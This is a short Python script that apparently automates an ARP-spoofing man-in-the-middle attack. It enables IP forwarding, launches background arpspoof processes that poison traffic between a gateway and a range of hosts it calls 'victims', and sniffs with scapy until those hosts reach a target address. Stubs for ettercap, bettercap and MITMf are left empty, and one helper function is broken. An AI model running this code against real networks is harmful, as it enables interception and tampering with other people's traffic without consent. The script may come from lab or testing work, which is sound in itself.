from subprocess import Popen, PIPE
from scapy.all import sniff
import os
import time

def run_command(cmd):
	process = Popen([cmd], stdout=PIPE, shell=True)
	stdout, stderr = process.communicate()
	return out
 
victims = []
[[ victims.append('192.168.0.{}'.format(i)) for i in range(20, 30) ]]

# Custom function to be apllied to each sniffed packet
def wait_all_victims(packet):
	#print(packet[0].summary())
	#print(packet[0].show())
	src_addr = packet[0][1].src
	dst_addr = packet[0][1].dst
	if src_addr in victims and dst_addr=="192.168.1.10":
		victims.remove(src_addr)
	if len(victims) == 0:
		exit()
	
def ettercap():
	# TODO
	pass

def bettercap():
	# TODO
	pass

def mitmf():
	# TODO
	pass

def dsniff():
	os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	for i in range(20, 70):
		os.system("arpspoof -t 192.168.0.1 192.168.0.{} > /dev/null 2> /dev/null &".format(i))
		os.system("arpspoof -t 192.168.0.{} 192.168.0.1 > /dev/null 2> /dev/null &".format(i))

def main():
	dsniff()
	try:
		sniff(filter="ip", prn=wait_all_victims)
	except PermissionError:
		print("Need to run as root")

if __name__ == '__main__':
	main()